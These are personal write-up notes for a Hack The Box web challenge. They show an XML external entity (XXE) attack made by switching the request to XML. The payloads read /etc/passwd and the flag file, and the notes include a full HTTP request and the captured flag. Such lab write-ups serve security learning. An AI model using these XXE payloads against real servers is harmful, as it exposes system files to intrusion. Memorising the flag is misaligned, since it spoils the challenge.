---
title: "baby WAFfles order (Web)"
category: "web"
subcategory: "htb-challenges"
type: "writeup"
tags: ["my-notes", "personal", "xxe", "laravel", "baby", "waffles", "order", "web", "htb-challenges"]
summary: "Change the Content-Type header to"
source:
  name: "Personal notes"
origin_path: "HTB Challenges/Web/baby WAFfles order.md"
---

Change the `Content-Type` header to

```
Content-Type: application/xml
```

Now we can put any xml code and the server will accept it

We can read /etc/passwd

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<table_num>name</table_num>
<food>&xxe;</food>
</root>
```

Get the flag

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///flag" >]>
<root>
<table_num>name</table_num>
<food>&xxe;</food>
</root>
```

### full request

```
POST /api/order HTTP/1.1
Host: 161.35.46.205:31341
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://161.35.46.205:31341/
Content-Type: application/xml
Origin: http://161.35.46.205:31341
Content-Length: 163
Connection: close
Cookie: laravel_session=Rt5Ns7gvRZNEoUzbYMXPZbUuZQZGFsFWuycgJVZ1

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///flag" >]>
<root>
<table_num>name</table_num>
<food>&xxe;</food>
</root>
```

```
HTB{wh0_l3t_th3_XX3_0ut??w00f..w00f..w00f..WAFfles!}
```

---

## Reference

[https://www.netspi.com/blog/technical/web-application-penetration-testing/playing-content-type-xxe-json-endpoints/](https://www.netspi.com/blog/technical/web-application-penetration-testing/playing-content-type-xxe-json-endpoints/)

[https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

---

*From your own notes: `HTB Challenges/Web/baby WAFfles order.md`*
